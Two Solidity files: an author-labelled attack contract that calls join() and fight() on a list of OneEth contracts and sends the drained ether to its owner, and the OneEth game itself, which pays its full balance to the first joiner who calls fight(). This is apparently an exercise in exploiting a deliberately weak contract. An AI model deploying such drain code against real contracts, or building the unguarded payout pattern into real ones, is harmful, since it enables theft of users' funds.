// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.0;

import "./OneEth.sol";

/// @author luibo
/// @notice simple attack contract


contract Owned {
    address internal owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Only the contact owner can call this function");
        _;
    }
}


contract Attack is Owned {

    address[] private contractInstances;
    OneEth private contractAddr;

    // Contract destructor
    function destroy() public onlyOwner {
        selfdestruct(payable(owner));
    }

    function setInstances(address[] memory contractInstances_) external {
        require(contractInstances_.length > 0, "A list of contract addresses must be given");
        contractInstances = contractInstances_;

        attack();
    }

    function attack() private {
        for(uint i = 0; i < contractInstances.length; i++) {
            contractAddr = OneEth(contractInstances[i]);
            contractAddr.join();
            contractAddr.fight();
        }

        payable(owner).transfer(address(this).balance);
    }

}

// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.0;

contract OneEth {
    /// @notice the winner
    address public winner;

    /// @notice joined players
    mapping(address => bool) public joined;

    /// @notice Event emitted when some address wins.
    event Win(address indexed winner);

    /// @notice Event emitted when some address joins the competition.
    event Joined(address indexed who);

    constructor() payable {}

    function join() external {
        require(winner == address(0), "game is over");
        require(!joined[msg.sender], "already joined");

        joined[msg.sender] = true;

        emit Joined(msg.sender);
    }

    function fight() external {
        require(winner == address(0), "game is over");
        require(joined[msg.sender], "not joined");

        winner = msg.sender;
        payable(msg.sender).transfer(address(this).balance);

        emit Win(msg.sender);
    }
}